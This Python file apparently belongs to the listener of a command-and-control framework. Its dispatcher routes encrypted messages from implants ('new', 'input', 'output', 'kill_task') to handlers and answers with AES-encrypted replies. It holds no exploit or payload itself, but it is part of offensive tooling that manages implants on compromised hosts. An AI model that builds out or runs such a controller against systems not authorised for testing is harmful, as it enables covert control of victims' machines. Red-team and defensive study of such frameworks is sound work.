from .output.core import main_output
from .input.core import main_input
from .new.core import main_new
from infra.database.listener_utils import listener_utils
from ..utils.tasks import abort_task
from ..utils.crypt import respond
from ..utils.metadata import process_metadata

async def main_actions(data, config, request=None, aes_key=None, body=None):
    # Here is where the request option is dispatched to the right handler
    task_tag = data.get("task_tag") if isinstance(data, dict) else None

    if isinstance(data, dict) and data.get("error") and task_tag:
        result = await listener_utils.apply_task_error(task_tag, data.get("error"))
        return await respond(aes_key, result, config=config)
    
    # ====================================================
    
    elif isinstance(data, dict) and data.get("option") == "input":
        await process_metadata(data, request)
        return await main_input(data, config, aes_key, body, request)
    
    # ====================================================
        
    elif isinstance(data, list) or (isinstance(data, dict) and data.get("option") == "output"):
        items = data if isinstance(data, list) else [data]
        for item in items:
            await process_metadata(item, request)
            status = await main_output(item, config)
            if status.get("status") != "success":
                result = await abort_task(item.get("task_tag"), status.get("message", "output processing failed"))
                return await respond(aes_key, result, config=config)
        return await respond(aes_key, {"status": "success", "message": "output received successfully"}, config=config)

    # ========================

    # ====================================================
      
    elif isinstance(data, dict) and data.get("option") == "new":
        result = await main_new(data, config, request)
        await process_metadata(data, request)
        return await respond(aes_key, result, config=config)

    # ====================================================
    
    elif isinstance(data, dict) and data.get("option") == "kill_task":
        result = await abort_task(task_tag, "Task killed by implant")
        return await respond(aes_key, result, config=config)
    
    # ====================================================
    
    else:
        result = await abort_task(task_tag, "Invalid option")
        return await respond(aes_key, result, config=config)
